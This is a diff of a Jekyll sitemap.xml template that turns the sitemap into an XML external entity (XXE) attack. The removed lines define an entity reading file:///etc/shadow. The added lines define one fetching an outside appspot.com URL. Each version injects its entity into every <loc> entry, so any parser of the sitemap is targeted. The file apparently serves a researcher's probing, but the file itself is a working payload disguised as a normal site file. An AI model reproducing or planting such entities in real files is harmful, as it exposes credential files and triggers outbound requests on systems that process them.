@@ -1,11 +1,11 @@
 ---
 ---
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE urlset [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE urlset [<!ENTITY xxe SYSTEM "http://antoniosanso.appspot.com/lol" >]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
     {% for post in site.posts %}
     <url>
-        <loc>http://asanso2.github.io{{ site.plugins_dir | remove: 'index.html' }}&ent;</loc>
+        <loc>http://asanso2.github.io{{ site.plugins_dir | remove: 'index.html' }}&xxe;</loc>
     </url>
     {% endfor %}
 
@@ -13,7 +13,7 @@
     {% if page.layout != nil %}
     {% if page.layout != 'feed' %}
     <url>
-        <loc>http://asanso2.github.io{{ site.plugins_dir | remove: 'index.html' }}&ent;</loc>
+        <loc>http://asanso2.github.io{{ site.plugins_dir | remove: 'index.html' }}&xxe;</loc>
     </url>
     {% endif %}
     {% endif %}
